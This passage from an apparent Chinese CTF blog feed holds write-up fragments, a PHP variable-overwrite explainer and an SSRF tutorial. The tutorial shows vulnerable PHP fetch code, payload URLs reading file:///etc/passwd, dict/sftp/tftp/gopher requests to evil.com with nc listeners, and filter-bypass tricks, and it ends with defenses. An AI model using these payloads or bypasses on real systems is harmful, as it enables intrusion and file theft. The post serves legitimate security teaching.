class="line">http://127.0.0.1:50569/uploads/yijuhua.php</span><br></pre></td></tr></table></figure><p>用蚁剑连接：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240818225907355.png" alt="image-20240818225907355"></p><p>之后打开虚空终端，输入set查看环境变量，得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240818230034762.png" alt="image-20240818230034762"></p><h2 id="垫刀之路03-这是一个图床">垫刀之路03: 这是一个图床</h2><p>考点：文件上传漏洞</p><p>只是进行了图片限制，只能上传图片类型，解法跟上面垫刀之路02一样。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞</title>
      <link href="/posts/50cf5e7c.html"/>
      <url>/posts/50cf5e7c.html</url>
      
        <content type="html"><![CDATA[<p>SSRF漏洞原理攻击与防御</p><p>一、SSRF是什么？<br>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p><p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>二、SSRF漏洞原理<br>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/966c60217969cfa4cf88e7c25bc06ea9.png" alt="在这里插入图片描述"></p><p>比如,黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器</p><p>三、SSRF漏洞挖掘<br>1、分享：通过URL地址分享网页内容</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/407be09f844afc7ebd841f62875762b6.jpeg" alt="在这里插入图片描述"></p><p>2、转码服务:通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览:由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务。</p><p>3、在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9a65e1c17a2c64f2f1a3cf799922f881.png" alt="在这里插入图片描述">4、图片、文章收藏功能:此处的图片、文章收藏中的文章收藏就类似于分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于功能四、图片加载。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de</span><br></pre></td></tr></table></figure><p>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。</p><p>5、未公开的api实现以及其他调用URL的功能:此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0b34525503d3f85c341b0c59f3f277f8.png" alt="在这里插入图片描述"></p><p>6、图片加载与下载:通过URL地址加载或下载图片，图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。</p><p>(此处可能会有人有疑问，为什么加载图片服务器上的图片也会有问题，直接使用img标签不就好了?没错是这样，但是开发者为了有更好的用户体验通常对图片做些微小调整例水印、压缩等所以就可能造成SSRF问题)。</p><p>7、从URL关键字中寻找<br>利用google 语法加上这些关键字去寻找SSRF漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">share</span><br><span class="line">wap</span><br><span class="line">url</span><br><span class="line">link</span><br><span class="line">src</span><br><span class="line">source</span><br><span class="line">target</span><br><span class="line">u</span><br><span class="line">display</span><br><span class="line">sourceURl</span><br><span class="line">imageURL</span><br><span class="line">domain</span><br></pre></td></tr></table></figure><p>简单来说：所有目标服务器会从自身发起请求的功能点，且我们可以控制地址的参数，都可能造成SSRF漏洞</p><p>四、产生SSRF漏洞的函数<br>SSRF攻击可能存在任何语言编写的应用，接下来将举例php中可能存在SSRF漏洞的函数。</p><p>1、file_get_contents:</p><p>下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_POST[&#x27;url&#x27;])) </span><br><span class="line">&#123; </span><br><span class="line">$content = file_get_contents($_POST[&#x27;url&#x27;]); </span><br><span class="line">$filename =&#x27;./images/&#x27;.rand().&#x27;;img1.jpg&#x27;; </span><br><span class="line">file_put_contents($filename, $content); </span><br><span class="line">echo $_POST[&#x27;url&#x27;]; </span><br><span class="line">$img = &quot;&lt;img src=\&quot;&quot;.$filename.&quot;\&quot;/&gt;&quot;; </span><br><span class="line">&#125; </span><br><span class="line">echo $img; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>2、sockopen():</p><p>以下代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function GetFile($host,$port,$link) </span><br><span class="line">&#123; </span><br><span class="line">$fp = fsockopen($host, intval($port), $errno, $errstr, 30); </span><br><span class="line">if (!$fp) &#123; </span><br><span class="line">echo &quot;$errstr (error number $errno) \n&quot;; </span><br><span class="line">&#125; else &#123; </span><br><span class="line">$out = &quot;GET $link HTTP/1.1\r\n&quot;; </span><br><span class="line">$out .= &quot;Host: $host\r\n&quot;; </span><br><span class="line">$out .= &quot;Connection: Close\r\n\r\n&quot;; </span><br><span class="line">$out .= &quot;\r\n&quot;; </span><br><span class="line">fwrite($fp, $out); </span><br><span class="line">$contents=&#x27;&#x27;; </span><br><span class="line">while (!feof($fp)) &#123; </span><br><span class="line">$contents.= fgets($fp, 1024); </span><br><span class="line">&#125; </span><br><span class="line">fclose($fp); </span><br><span class="line">return $contents; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>3、curl_exec():</p><p>cURL这是另一个非常常见的实现，它通过 PHP获取数据。文件/数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if (isset($_POST[&#x27;url&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">$link = $_POST[&#x27;url&#x27;];</span><br><span class="line">$curlobj = curl_init();</span><br><span class="line">curl_setopt($curlobj, CURLOPT_POST, 0);</span><br><span class="line">curl_setopt($curlobj,CURLOPT_URL,$link);</span><br><span class="line">curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$result=curl_exec($curlobj);</span><br><span class="line">curl_close($curlobj);</span><br><span class="line"></span><br><span class="line">$filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;;</span><br><span class="line">file_put_contents($filename, $result); </span><br><span class="line">echo $result;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>注意事项:</p><p>1.一般情况下PHP不会开启fopen的gopher wrapper<br>2.file_get_contents的gopher协议不能URL编码<br>3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败<br>4.curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用<br>5.curl_exec() 默认不跟踪跳转，<br>6.file_get_contents() file_get_contents支持php://input协议</p><p>五、SSRF中URL的伪协议<br>当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议</p><p>file:/// 从文件系统中获取文件内容，如，file:///etc/passwd<br>dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：<br>sftp:// SSH文件传输协议或安全文件传输协议<br>ldap:// 轻量级目录访问协议<br>tftp:// 简单文件传输协议<br>gopher:// 分布式文档传递服务，可使用gopherus生成payload</p><p>1、file</p><p>这种URL Schema可以尝试从文件系统中获取文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=file:///etc/passwd</span><br><span class="line">http://example.com/ssrf.php?url=file:///C:/Windows/win.ini</span><br></pre></td></tr></table></figure><p>如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：</p><p>2、dict</p><p>这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?dict://evil.com:1337/</span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*]</span><br><span class="line">accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</span><br></pre></td></tr></table></figure><p>3、sftp</p><p>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=sftp://evil.com:1337/</span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*]</span><br><span class="line">accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2</span><br></pre></td></tr></table></figure><p>4、ldap://或ldaps:// 或ldapi://</p><p>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit</span><br><span class="line">http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit</span><br><span class="line">http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</span><br></pre></td></tr></table></figure><p>5、tftp://</p><p>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET</span><br><span class="line">evil.com:# nc -lvup 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</span><br></pre></td></tr></table></figure><p>6、gopher://</p><p>Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-&lt;?php header(&#x27;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#x27;);?&gt;</span><br><span class="line">evil.com:# nc -lvp 1337</span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest</span><br></pre></td></tr></table></figure><p>六、SSRF漏洞利用（危害）<br>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p><p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p><p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p><p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p><p>5.利用file协议读取本地文件等。.</p><p>6.各个协议调用探针：http,file,dict,ftp,gopher等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:192.168.64.144/phpmyadmin/</span><br><span class="line">file:///D:/www.txt</span><br><span class="line">dict://192.168.64.144:3306/info</span><br><span class="line">ftp://192.168.64.144:21</span><br></pre></td></tr></table></figure><p>七、SSRF绕过方式<br>部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下：</p><p>一、常见的绕过方式</p><p>1、限制为http://www.xxx.com 域名时（利用@）</p><p>可以尝试采用http基本身份认证的方式绕过<br>如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.aaa.com@www.bbb.com@www.ccc.com</span><br></pre></td></tr></table></figure><p>，在对@解析域名中，不同的处理函数存在处理差异<br>在PHP的parse_url中会识别www.ccc.com，<a href="http://xn--libcurlwww-4x2pt58aygs302d20nb.bbb.com">而libcurl则识别为www.bbb.com</a>。</p><p>2.采用短网址绕过</p><p>比如百度短地址https://dwz.cn/</p><p>3.采用进制转换</p><p>127.0.0.1</p><p>八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.</p><p>4.利用特殊域名</p><p>原理是DNS解析。xip.io可以指向任意域名，即<br><a href="http://127.0.0.1.xip.io">127.0.0.1.xip.io</a>，可解析为127.0.0.1<br>(<a href="http://xip.io">xip.io</a> 现在好像用不了了，可以找找其他的)</p><p>5.利用[::]</p><p>可以利用[::]来绕过localhost<br><a href="http://169.254.169.254">http://169.254.169.254</a>&gt;&gt;http://[::169.254.169.254]</p><p>6.利用句号</p><p>127。0。0。1 &gt;&gt;&gt; 127.0.0.1</p><p>7、CRLF 编码绕过</p><p>%0d-&gt;0x0d-&gt;\r回车<br>%0a-&gt;0x0a-&gt;\n换行<br>进行HTTP头部注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a</span><br></pre></td></tr></table></figure><p>8.利用封闭的字母数字</p><p>利用Enclosed alphanumerics</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com</span><br><span class="line">http://169.254.169.254&gt;&gt;&gt;http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳</span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇</span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛</span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵</span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ</span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ</span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴</span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure><p>二、常见限制</p><p>1.限制为http://www.xxx.com 域名</p><p>采用http基本身份认证的方式绕过，即@</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com@www.xxc.com</span><br></pre></td></tr></table></figure><p>2.限制请求IP不为内网地址</p><p>当不允许ip为内网地址时：<br>（1）采取短网址绕过<br>（2）采取特殊域名<br>（3）采取进制转换</p><p>3.限制请求只为http协议</p><p>（1）采取302跳转<br>（2）采取短地址</p><p>八、SSRF漏防御<br>通常有以下5个思路：</p><p>1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p><p>2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p><p>3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p><p>4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p><p>5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>变量覆盖漏洞</title>
      <link href="/posts/e2679a86.html"/>
      <url>/posts/e2679a86.html</url>
      
        <content type="html"><![CDATA[<p>记录网站：【CTF_Web：php中的变量覆盖问题 - CSDN App】<a href="http://t.csdnimg.cn/LAmY1">http://t.csdnimg.cn/LAmY1</a></p><h2 id="变量覆盖函数-parse-str-、extract-、import-request-variables">变量覆盖函数:parse_str() 、extract()、import_request_variables()</h2><p>1.什么是变量覆盖<br>变量覆盖基本都来自于各种函数（parse_str() 、extract()、import_request_variables()等）对用户输入取值时的问题，当用户对已经存在的变量再次通过<br>各种函数赋值时，将会触发变量覆盖，修改之前定义的值，这类问题需要严格定义用户可以输入的部分，或值避免使用存在此类问题的函数。</p><p>2.parse_str() 函数<br>原型：parse_str(string,array)<br>定义和用法：parse_str() 函数把查询字符串解析到变量中。<br>如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。<br>php.ini文件中的 magic_quotes_gpc设置影响该函数的输出。如果已启用，那么在 parse_str()解析之前，变量会被 addslashes()转换。<br>例子：</p><?phpparse_str("name=Peter&age=43");echo $name."<br>";   //Peterecho $age;     //43?><p>3.extract()函数<br>原型：extract(array,extract_rules,prefix)，其中第一个参数为指定的数组，第二个为创建变量的规则，第三个为需要增加的前缀。<br>1.array必需。规定要使用的数组。<br>2.extract_rules  可选。extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。<br>可能的值：<br>EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。<br>EXTR_SKIP - 如果有冲突，不覆盖已有的变量。<br>EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。<br>EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。<br>EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 prefix。<br>EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。<br>EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。<br>EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。<br>3.prefix  可选。如果 extract_rules 参数的值是 EXTR_PREFIX_SAME、EXTR_PREFIX_ALL、 EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS，则 prefix 是必需的。该参数规定了前缀。前缀和数组键名之间会自动加上一个下划线。</p><p>定义和用法：<br>extract() 函数从数组中将变量导入到当前的符号表。<br>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。<br>该函数返回成功设置的变量数目。<br>例子：</p><?php$a = "Original";$my_array = array("a" => "Cat", "b" => "Dog", "c" => "Horse");extract($my_array, EXTR_PREFIX_SAME, "dup");echo "\$a = $a; \$b = $b; \$c = $c; \$dup_a = $dup_a";?><p>//$a = Original; $b = Dog; $c = Horse; $dup_a = Cat   这里冲突后为冲突的变量加了前缀dup和下划线。<br>这个变量覆盖漏洞其实就是来源于EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。</p><p>当没有指定规则的时候就会发生变量覆盖。</p><?php$flag="ook!";extract($_GET);  echo $flag;if($key==$flag){    echo $flag;}else{    echo'Oh.no';}?><p>由于首先为flag赋值，后extract了GET的值，所以会将已经存在的进行覆盖。</p><p>4。import_request_variables()函数<br>原型：bool import_request_variables ( string $types [, string $prefix ] )返回bool型结果。<br>$types：指定需要导入的变量，可以用字母 G、P 和 C 分别表示 GET、POST 和 Cookie，这些字母不区分大小写，所以你可以使用 g 、 p 和 c 的任何组合。POST 包含了通过 POST 方法上传的文件信息。注意这些字母的顺序，当使用 gp 时，POST 变量将使用相同的名字覆盖 GET 变量。任何 GPC 以外的字母都将被忽略。<br>$prefix： 变量名的前缀，置于所有被导入到全局作用域的变量之前。所以如果你有个名为 userid 的 GET 变量，同时提供了 pref_ 作为前缀，那么你将获得一个名为 $pref_userid 的全局变量。虽然 prefix 参数是可选的，但如果不指定前缀，或者指定一个空字符串作为前缀，你将获得一个 E_NOTICE 级别的错误。</p><p>定义和用法：<br>import_request_variables() 函数将 GET／POST／Cookie 变量导入到全局作用域中。该函数在最新版本的 PHP 中已经不支持。<br>import_request_variables() 函数将 GET／POST／Cookie 变量导入到全局作用域中。如果你禁止了 register_globals，但又想用到一些全局变量，那么此函数就很有用。<br>版本要求：PHP 4 &gt;= 4.1.0, PHP 5 &lt; 5.4.0</p><p>例子：</p><?php// 此处将导入 GET 和 POST 变量$a= "abc";import_request_variables("gP");  //不使用前缀将会覆盖。echo $a;?><p>传入?a=1111将会把已定义的a值覆盖。</p><h2 id="">$$</h2><p>看下面这个例子：</p><p>$a=‘hello’;<br>$b=‘world’;<br>$$a=$b;<br>echo($hello);<br>最后的输出结果为world</p><p>这里先是定义了a,b两个变量，分别赋值hello和world。接着，$$a表示将变量a的值变成一个变量即$hello，然后将变量b的值赋给它，最后输出world。<br>所以在源码中看到$$可以想到变量覆盖漏洞。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Basectf比赛week1-wp</title>
      <link href="/posts/1886aec0.html"/>
      <url>/posts/1886aec0.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="MISC">MISC</h2><h4 id="Week1-签到！DK-盾！">[Week1] 签到！DK 盾！</h4><p>关注公众号得到flag。</p><h4 id="Week1-Base">[Week1] Base</h4><p>考点：base编码</p><p>下载附件得到一串base编码，解密得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815183028571.png" alt="image-20240815183028571"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815183051398.png" alt="image-20240815183051398"></p><h4 id="Week1-正着看还是反着看呢？">[Week1] 正着看还是反着看呢？</h4><p>考点：文件逆序，文件分离</p><p>附件压缩包解压发现一个名为flag的未知文件，用010editor打开发现文件逆序了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815183306729.png" alt="image-20240815183306729"></p><p>使用脚本将文件顺序调换回来，得到一张jpg图片。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815184020850.png" alt="image-20240815184020850"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815184010960.png" alt="image-20240815184010960"></p><p>用010editor打开，发现藏了一个隐藏文件flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815184131348.png" alt="image-20240815184131348"></p><p>提取出来得到flag.</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815184306841.png" alt="image-20240815184306841"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815184334599.png" alt="image-20240815184334599"></p><h4 id="Week1-海上遇到了鲨鱼">[Week1] 海上遇到了鲨鱼</h4><p>考点：流量分析</p><p>打开是个pcapng文件，用wireshark打开。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815184514652.png" alt="image-20240815184514652"></p><p>检索关键词flag，用tcp流打开，查看流，最后找到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815184725885.png" alt="image-20240815184725885"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815184801405.png" alt="image-20240815184801405"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815184832777.png" alt="image-20240815184832777"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815184904549.png" alt="image-20240815184904549"></p><h4 id="Week1-人生苦短，我用Python">[Week1] 人生苦短，我用Python</h4><p>考点：代码审计，搜索引擎</p><p>打开程序，一段超长python代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">abort</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;You failed test %d. Try again!&#x27;</span> % <span class="built_in">id</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"><span 